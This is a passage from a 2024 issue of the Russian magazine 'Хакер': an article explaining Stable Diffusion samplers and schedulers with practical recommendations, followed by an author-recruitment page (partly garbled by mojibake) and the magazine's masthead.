порог, будут практически неотличимы, поэтому дальнейшее увеличение числа
шагов для этого класса алгоритмов лишено смысла.


Семплеры класса ancestral
Выше я привел скриншот, на котором перечислены доступные в WebUI
ReForge семплеры. Обрати внимание: названия некоторых из них заканчива‐
ются на «a» (как, например, выбранный на скриншоте семплер Эйлера —
классический вариант, который поддерживает большинство моделей).





Такие семплеры добавляют стохастический (случайный) элемент на каждом
шаге генерации. Каждый следующий шаг в генерации изображения добав‐
ляет небольшое количество случайного шума, что позволяет как разнооб‐
разить результат, так и улучшить точность. Название происходит от термина
ancestral sampling («наследуемый семплинг»), где каждое следующее сос‐
тояние «наследуется» от предыдущего с добавлением шума.
   Легко заметить, что семплеры этого класса не являются сходящимися
(конвергентными).  Увеличение  числа шагов  с  определенного  момента
не приводит к улучшению картинки, а лишь изменяет мелкие детали. С этим
попытались справиться разработчики семплеров класса SDE.


DPM, DPM++ и их производные
Семплеры классов DPM (Diffusion Probabilistic Model solver) и DPM++ (улуч‐
шенная версия DPM) были разработаны для повышения качества и детали‐
зации изображений за меньшее количество шагов. В базовой версии DPM
(без плюсов) процесс диффузии разбит на множество мелких шагов, что
обеспечивает высокую точность генерации за счет высокого количества ите‐
раций. DPM++ использует методы более высокого порядка, что позволяет
сводить изображение с меньшим количеством шагов без ухудшения резуль‐
татов.
   Расшифровать названия семплеров просто (понять — сложнее). Так, наз‐
вание DPM++ 3M SDE расшифровывается следующим образом:
 • DPM++ —  улучшенная  (++)  версия  диффузионного  вероятностного
   моделирования DPM (Diffusion Probabilistic Model). DPM++ может работать
   в одноступенчатом (S) и многоступенчатом (M) режимах;
 • 3M — третий  (3) порядок многоступенчатого (M) метода  (third-order
   multistep method). В теории использование производных третьего порядка
   обещает повышенную по сравнению с методами более низкого порядка
   точность генерации;
 • SDE — сокращение от стохастических дифференциальных уравнений
   (Stochastic Differential Equations), которые используются для моделирова‐
   ния случайных процессов. Если в названии семплера присутствует SDE,
   такой семплер — несходящийся.

DPM++ 2S a расшифровывается так:
 • DPM++ — уже знаем;
 • 2S — второй (2) порядок одноступенчатого (S — single-step) метода.
   Использует производные второго порядка;
 • a —  ancestral,  указывает на использование  стохастического метода,
   который добавляет случайный шум на каждом шаге генерации. Если в наз‐
   вании семплера присутствует окончание a, такой семплер — несходящий‐
   ся.

Если сравнивать разные варианты DPM++ между собой, то станет заметно,
что DPM++ SDE работает вдвое медленнее, чем DPM++ 2M SDE или DPM++
3M SDE, но и требует вдвое меньшего числа шагов для схождения картинки.
Достоинство это или недостаток — зависит от сценария использования.
В большинстве генераций, использующих повышение разрешения методом
Hires Fix и последующую детализацию в ADetailer/uddetailer, удобнее исполь‐
зовать более быстрые и короткие шаги (DPM++ 3M SDE).
   Семплеры DPM++ дают более детализированное по сравнению с Euler
и Euler a изображение. Это касается как текстур (например, текстур ткани
и кожи), так и множества мелких деталей. Такая детализация может работать
как в плюс, так и в минус. Семплеры DPM++ рекомендуют использовать
при генерации резких фотореалистичных изображений, в то время как Euler
лучше подходит для генерации более «мягких» фотографий, а также изоб‐
ражений в стиле 3D, 2,5D и аниме.
   Пример: работа семплера третьего порядка DPM++ 3M SDE в сравнении
с DPM++ 2S a.





SDE: щепотка случайности
Семплеры, в названии которых есть SDE, основаны на стохастических диф‐
ференциальных уравнениях (SDE). Алгоритмы SDE добавляют шум на каждом
шаге генерации, но, в отличие от семплеров ancestral, этот шум не полностью
случайный, а вычисляется на основе системы уравнений.
   Таким образом, семплеры можно условно разделить по типу шума, добав‐
ляемого на каждом шаге генерации. Сходящиеся (конвергентные) семплеры
шум не добавляют. Семплеры класса ancestral вводят случайный шум на каж‐
дом шаге генерации. В семплерах SDE шум псевдослучайный; он определя‐
ется дифференциальными уравнениями, что делает генерацию более пред‐
сказуемой по сравнению с семплерами ancestral, но менее предсказуемой
по сравнению с конвергентными семплерами.
  На практике семплеры класса SDE не являются конвергентными; изме‐
нение числа шагов при прочих равных условиях может серьезно изменить
композицию итогового изображения. Посмотри, как меняется картинка, сге‐
нерированная семплером DPM++ SDE с 40 и 80 шагами (все остальные
параметры идентичны).





Практический вывод: если картинка, сгенерированная одним из таких сем‐
плеров, тебя в целом устраивает, но есть какие‑то мелкие огрехи, попробуй
немного увеличить или уменьшить число шагов. Зачастую ты получишь
похожую картинку, но уже без дефекта.


Специализированные семплеры
С появлением технологий ускоренной генерации — таких как LCM, Turbo,
Lightning, Hyper, Flash, TCD, DMD2 — возникла необходимость в специали‐
зированных  семплерах. С обычными  настройками  такие модели могут
не работать вообще или работать некорректно. Так, модель LCM требует
использовать  одноименный  семплер,  модели  Turbo  проектировались
для работы с одноименным шедулером, технология Lightning предполагает
использование шедулера SGM Uniform. Более современные версии ускорен‐
ных моделей, как правило, не требуют использования специфических ком‐
бинаций семплера и шедулера.
   Впрочем, разработчики ремиксов уже научились частично обходить огра‐
ничения, и даже такие модели стало возможным использовать с привычными
комбинациями семплера и шедулера.
   Особняком стоят некоторые специализированные модели. Так, модель
CosXL, которая в рамках архитектуры SDXL предлагает расширенный динами‐
ческий диапазон и глубокий черный цвет, требует использовать Cosine-
Continuous EDM VPred  (в WebUI ReForge  подключается  автоматически
при   загрузке  модели  CosXL;  в  Comfy   нужно  доустановить  ноду
ModelSamplingContinuousEDM), а модель Playground 2.5 требует безальтер‐
нативного  использования EDM  (поддерживается  на  сегодня  только
в Comfy/SwarmUI). Эти вещи не относятся к стандартному выбору семплера
и шедулера; вместо этого в новой версии WebUI Forge нужно использовать
расширение Advanced Model Sampling.


Лучшее — враг хорошего?
Новые семплеры и шедулеры появляются постоянно. Их разработчики реша‐
ют самые разные задачи. В числе улучшений могут быть как повышенная ско‐
рость генерации (на самом деле — генерация картинки за меньшее число
шагов, но вовсе не обязательно за меньшее время), так и более точный
результат с меньшим количеством брака (такое обещали разработчики
шедулера Align Your Steps; о нем мы еще поговорим в соответствующем раз‐
деле).
   Насколько это работает в действительности? По‑разному. Так, разработ‐
чики семплера UniPC обещали много полезных вещей, но проверку реаль‐
ностью алгоритм не прошел: он доступен и поддерживается в большинстве
моделей, но результаты, хоть они и отличаются от работы других алгоритмов,
нельзя с уверенностью назвать «лучшими».





Семплер Restart, интересный тем, что с определенной периодичностью
«откатывает» генерацию на несколько шагов назад, должен был исправлять
небольшие огрехи отрисовки мелких деталей. По скорости работы этот сем‐
плер похож на DPM++ SDE, по точности результата, пожалуй, его превос‐
ходит, предлагая при этом максимально высокую в сравнении с семейством
DPM++ детализацию.
   Restart — универсальный семплер; его можно использовать для создания
как фотореалистичных, так и рисованных изображений. Его применение
в  ADetailer может  позволить  исправить  мелкие  дефекты  изображения,
которые в недостаточной степени корректируются другими семплерами.





Чрезвычайно интересны вариации метода Эйлера — семплеры Euler Smea
Dy и Euler Negative.
   Семплеры, в названии которых есть слово Negative, в процессе генерации
изображения учитывают отрицательные значения градиентов, что в теории
позволяет улучшить качество конечного изображения.
   Ниже — пример генерации Euler Negative (шедулер AYS). Обрати вни‐
мание на стиль изображения; он заметно отличается от работы всех других
семплеров.





Уникальную нишу занимает семплер Euler Smea Dy, использующий геомет‐
рические методы навигации в трехмерном пространстве для приближения
к исходному изображению. Особенность этого семплера в том, что он может
значительно уменьшать структурные искажения и проблемы с конечностями
(да‑да, всё те же многострадальные пальцы рук). Увы, полностью решить
проблему с руками в рамках архитектуры SDXL пока не удалось никому,
но этот семплер действительно улучшает качество прорисовки рук по срав‐
нению с аналогами.
  В то же время — и это легко читается между строк даже в «рекламном
проспекте» разработчиков — эти улучшения достигаются за счет более плав‐
ных линий и градиентов, упрощения картинки и снижения микроконтраста.
Если использовать Euler Smea Dy для генерации фотореалистичного изоб‐
ражения, то акцент будет  сдвинут максимально в  сторону фотографии
с софт‑эффектом. А вот аниме этот семплер рисует отлично: плавные линии
и градиенты — это в целом именно то, что надо. Таким образом, я могу
рекомендовать этот семплер для следующих целей:
 • рисование кистей рук в ADetailer (просто выбери в настройках ADetailer
   отдельный семплер и шедулер);
 • генерация картинок в стиле аниме;
 • создание фотореалистичных изображений с рассеянным освещением,
   в стиле ретро и стилистике софт‑фото.

В процессе тестирования я обнаружил интересную особенность семплеров
класса Dy (в частности, Euler Smea Dy). Они, согласно документации, работа‐
ют, делая выборку на пониженном разрешении (то есть размер картинки
«втискивается» в «зону комфорта» модели). Поэтому семплер Euler Smea Dy
можно использовать для получения изображения в более высоком по срав‐
нению со стандартом разрешении. Мне удалось добиться стабильно высоко‐
го качества генерации в разрешении 1024 на 1536 точек, что довольно
далеко за пределами стандартных возможностей SDXL. Правда, при даль‐
нейшем повышении разрешения функцией Hires.fix (например, в 1,4 раза)
трюк уже не работает, и в качестве Hires sampling method теперь нужно уста‐
новить обычный Euler. С использованием этой комбинации (Euler Smea Dy
для генерации и Euler для повышения разрешения) на выходе — детальная
и чистая картинка.





Обрати внимание: Euler Smea Dy относится к агрессивным семплерам.
При его использовании в Hires Fix и ADetailer тебе, возможно, придется серь‐
езно  снизить значение Denoise; в  противном  случае могут  проявиться
нежелательные мутации.
   Ниже — пример Euler Smea Dy. Обрати внимание, насколько проще стала
картинка.





А вот сравнение (из репозитория).





        WWW

                        Подробнее об этих семплерах — в репозитории
                           Koishi-Star.





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

        СЕМПЛЕРЫ
       И ШЕДУЛЕРЫ
              РАЗБИРАЕМ ДВА ВАЖНЫХ
              МЕХАНИЗМА УЛУЧШЕНИЯ
              ГЕНЕРАТИВНЫХ КАРТИНОК





ШЕДУЛЕРЫ

Помимо семплера, ты можешь выбрать и шедулер. Значение Automatic озна‐
чает   выбор   наиболее    подходящего    (прописанного   в   файле
sd_samplers_kdiffusion.py) шедулера для  конкретного  семплера.  Так,
для семплеров DPM++ 2M, DPM++ SDE, DPM++ 2M SDE, DPM++ 2S a, DPM2,
Restart оптимальным  считается шедулер Karras; для DPM++ 3M SDE —
Exponential. Для остальных семплеров  (Euler, Euler  a, LCM и так далее)
шедулер по умолчанию не прописан и широкой публике неизвестен; веро‐
ятно, используется Uniform.


Uniform: отправная точка
При использовании шедулера Uniform плотность шагов денойзинга (обратной
диффузии) равномерна по всей временной шкале генерации. Каждый шаг
денойзинга получает одинаковый вес, и процесс генерации шума или его
удаления на каждом шаге происходит с постоянной скоростью, без учета
динамики изменения деталей изображения.
   Uniform — самый простой метод; в большинстве случаев альтернативные
шедулеры его превосходят. Если ты все же решишь его использовать, то
в WebUI он доступен с обозначением Normal.
   Вариация этого шедулера — SGM Uniform (Stochastic Gradient Method,
стохастический метод  градиентного  спуска). В  частности,  пользователи
сообщают, что семплер Euler в комбинации с шедулером SGM Uniform
и DPM++ 2M SGM Uniform лучше всего работает с моделью SD3 Medium.
   Наконец, закрою этот раздел описанием шедулера Simple. Его создал
разработчик ComfyUI в качестве развлечения. Он хотел добиться простей‐
шего решения, при котором сохранялась бы работоспособность. В этом сем‐
плере плотность шагов зависит исключительно от номера шага.


Karras
Шедулер Karras — один из первых алгоритмов, использующих нелинейное
распределение шагов. Это позволило оптимизировать процесс генерации
изображений: улучшить качество картинки и уменьшить количество тре‐
буемых для ее генерации шагов. Именно этот шедулер стал стандартом
де‑факто благодаря отсутствию ярко выраженных особенностей. Он хорошо
работает со средним числом шагов и отлично — с большим (как мы помним,
достаточность числа шагов определяется в первую очередь семплером).


Экспоненциальный шедулер
В работе Fast Sampling of Diffusion Models with Exponential Integrator описано
использование экспоненциального шедулера. В экспоненциальном шедуле‐
ре плотность шагов распределяется по экспоненте и каждая следующая ите‐
рация экспоненциально уменьшает величину шага: в начале процесса шаги
изменяются очень быстро, но по мере продвижения изменение плотности
шагов замедляется.
  В шедулере Polyexponential комбинируется несколько экспоненциальных
функций для получения разных профилей изменения шагов. Exponential про‐
ще — с фиксированной экспоненциальной скоростью уменьшения шагов;
Polyexponential потенциально может быть более точным.
   Шедулеры Karras и Exponential выдают похожий результат. Изначально
использовать  Karras  предполагалось с  семплерами  семейства DPM++,
за  исключением DPM++ 3M SDE, для  которого  предлагался шедулер
Exponential. Сейчас же у нас есть возможность использовать любые шедуле‐
ры в связке с любыми семплерами, даже самыми старыми, чем мы и восполь‐
зуемся.
   Ниже — сравнение генерации Euler a шедулером Karras и Exponential.





Align Your Steps
Метод был предложен разработчиками Nvidia в июле 2024 года. В опуб‐
ликованном исследовании приводятся многочисленные сравнения работы
шедулера на разных моделях. Разработчики говорят о лучшем качестве кар‐
тинки и более точной детализации при меньшем числе шагов генерации
в сравнении с другими шедулерами.
  На практике наблюдаются статистически значимые улучшения в качестве
картинки (то есть необязательно в этом конкретном изображении — но при
генерации пачки из десяти штук с этим шедулером количество брака, как пра‐
вило,  будет  меньше).  Наиболее явно  преимущества AYS  проявляются
на небольшом числе шагов (до 40 шагов при использовании семплера Euler).
Дальнейшее увеличение числа шагов нивелирует преимущества метода. Тем
не менее его можно рекомендовать в качестве опции по умолчанию, если
используемая модель не требует иных настроек.


             INFO

                    При использовании Align Your Steps рекомендует‐
                        ся включить опцию Skip Early CFG (в WebUI она
                         называется Ignore negative prompt during  early
                          sampling), что улучшает качество генерации. Дос‐
                            таточно пропустить CFG только на первом шаге,
                          установив значение ползунка в 0,05 (или другое
                          значение в зависимости от числа шагов).


Примеров здесь не будет: все изображения в этой статье (за исключением
тех, на которых демонстрируются различия между шедулерами) сгенерирова‐
ны с использованием AYS.


BETA

Beta  —  еще   один   инновационный   шедулер,   представленный
в июле 2024 года корейскими разработчиками. Если практически все тра‐
диционные шедулеры используют более крупные шаги в начале генерации
с последующим уменьшением шага (уменьшение шагов как раз и описыва‐
ется той или иной математической функцией), то в методе Beta применяется
другой способ распределения плотности шагов.
  По заявлению разработчиков, наиболее важны ранние (крупные детали)
и поздние (мелкие, высокочастотные детали) этапы генерации изображения.
Соответственно, шедулер Beta фокусирует вычислительные ресурсы на пер‐
вых и последних шагах, что должно, с одной стороны, стимулировать более
точное следование запросу (ранние этапы, общая композиция и крупные
детали), а с другой — уменьшить влияние типичных для Stable Diffusion проб‐
лем с мелкими деталями (пресловутые пальцы рук).
   Таким образом, шедулер Beta не предназначен для ускорения генерации,
но хорошо работает при относительно большом числе шагов.
   Обрати внимание: Beta — чрезвычайно агрессивный шедулер. При его
использовании в Hires Fix и ADetailer тебе необходимо серьезно снизить зна‐
чения Denoise, а лучше — не использовать Beta в этих сценариях вовсе (бла‐
го в обоих случаях можно свободно указать альтернативную связку семплера
и шедулера).
   Beta хорошо подходит к классическим семплерам. Вот пример работы
Beta совместно с семплером Euler a.





Если же ты попытаешься использовать связку из агрессивного семплера
и агрессивного шедулера Beta,  результат будет  непредсказуем. Может
получиться как очень интересное изображение, так и брак.
   Сравни результат с семплером Euler Negative. В первом случае шедулер
Karras, во втором — Beta.





В общем, Beta — очень необычный шедулер. Его обязательно стоит поп‐
робовать, причем не один раз, на разных моделях и различных видах изоб‐
ражений.


ШПАРГАЛКА

Статья была длинная, а словосочетания «многоступенчатый метод третьего
порядка диффузионного вероятностного моделирования» и «полиэкспонен‐
циальный профиль изменения плотности шагов» способны напрочь отклю‐
чить мозг доверчивого читателя. Поэтому здесь — краткая выжимка.
   Важно: ты можешь выбрать любую комбинацию из семплера и шедулера.
Старые семплеры прекрасно работают с современными шедулерами.
   Семплеры:
 • Euler a — несмотря на почтенный возраст (256 лет, практически юби‐
   лей!), метод Эйлера все еще на коне и вполне способен дать фору нович‐
   кам. Универсальный семплер, довольно быстрый, с относительно невысо‐
   кой детализацией.
 • DPM++ 3M SDE — прекрасный семплер для фотореалистичных изоб‐
   ражений; пожалуй, не стоит использовать его для аниме (впрочем — дело
    вкуса).
 • Restart — применим там, где нужна максимальная детализация. Отно‐
   сительно медленный семплер, но и не требующий большого числа шагов.
 • DPM++  SDE —  медленный  семплер  с  высокой  детализацией.
  Для фотореалистичных изображений.
 • Euler Negative, Euler Negative Dy — вариации на тему Euler, превос‐
   ходящие его по качеству, но не по скорости. Степень детализации ана‐
   логична обычному Euler, но точность, пожалуй, повыше.
 • Euler Smea Dy — специфический семплер, подходит для аниме, рет‐
  рофото и фото с мягким фокусом. Агрессивен; при использовании в Hires
    Fix стоит снизить значение Denoising strength. Незаменим в ADetailer
   для исправления пальцев рук (не поленись и используй!).

Шедулеры:
 • Karras — золотая середина, стандарт де‑факто для современных сем‐
   плеров, но работает и с Euler. Универсален и очень неплох.
 • Exponential — очень похож на  Karras, но  проще.  Предназначался
   для использования с семплером DPM++ 3M SDE, но работает и с другими.
 • Align Your Steps — более совершенный по сравнению с Karras вариант.
   Совместим со всеми семплерами; его можно установить по умолчанию.
 • Beta — уникальный, далекий от универсальности шедулер, в котором
   плотность шагов максимальна в самом начале и самом конце генерации.
  В теории это дает как высокую точность (начало генерации), так и детали‐
  зацию (ее конец). На практике результат как минимум необычен; стоит
   попробовать на разных сюжетах. Относится к агрессивным шедулерам (не
   стоит использовать его в Hires Fix и ADetailer).


Дополнительные подробности
Хороших статей по семплерам и шедулерам на русском языке мне найти
не удалось, но на английском их достаточно. Мое внимание привлекли две:
 • Complete guide to samplers in Stable Diffusion — Félix Sanz (felixsanz.dev)
 • Stable Diffusion Samplers: A Comprehensive Guide — Stable Diffusion Art
   (stable-diffusion-art.com)

Также рекомендую глянуть тред на «Реддите»: Ever wondered what those
cryptic sampler names like «DPM++ 2s a Karras» actually mean? Look no further.
  В этих статьях дается теоретическая база с примерами. К сожалению,
в них рассмотрены только классические варианты алгоритмов; нет ни новых
шедулеров (Align Your Steps, Beta, Exponential, SGMUniform), ни новых семпле‐
ров (CFG++, ODE, Euler Dy, Euler Negative, Euler Smea Dy). Тем не менее эти
статьи важны, так как дают базовое представление о том, какие бывают вари‐
анты.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
    №11 (308)

            Андрей Письменный      Валентин Холмогоров        Илья Русанен
               Главный редактор         Ведущий редактор                Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                          Евгения Шарипова           yambuto
                            Литературный редактор          Бильд‑редактор
                                                   yambuto@gmail.com


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий‑Стем‐
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                           Вопросы о подписке:        ​Вопросы о материалах:
                                 lapina@glc.ru                support@glc.ru​





Учредитель: ИП Яковлева Анна Вадимовна ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Московская область,
Пушкино, мкр Софрино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегистрировано Федеральной службой по надзору в сфере связи,
информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2024